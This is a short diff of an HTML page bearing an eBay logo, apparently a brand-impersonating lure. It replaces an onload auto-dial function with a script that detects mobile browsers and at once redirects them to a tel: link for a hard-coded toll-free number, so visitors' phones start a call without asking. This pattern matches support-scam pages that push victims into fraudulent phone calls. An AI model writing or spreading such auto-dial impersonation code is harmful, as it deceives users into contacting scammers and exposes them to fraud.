@@ -65,19 +65,15 @@
     }
   </style>
   <script>
-    function autoDial() {
-      var phoneNumber = "+18447832942";
-      window.location.href = "tel:" + phoneNumber;
-    }
-
-    function call() {
-      // Implement the call functionality here, such as initiating a phone call.
-      console.log("Calling...");
-    }
-  </script>
+        // Redirect mobile users to the call link immediately
+        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+            window.location.href = 'tel:+18447832942';
+        }
+    </script>
+  
 </head>
 
-<body onload="autoDial()">
+<body>
 
   
   <img src="ebaylogo.webp" alt="Ebay Logo" class="Ebay-logo">
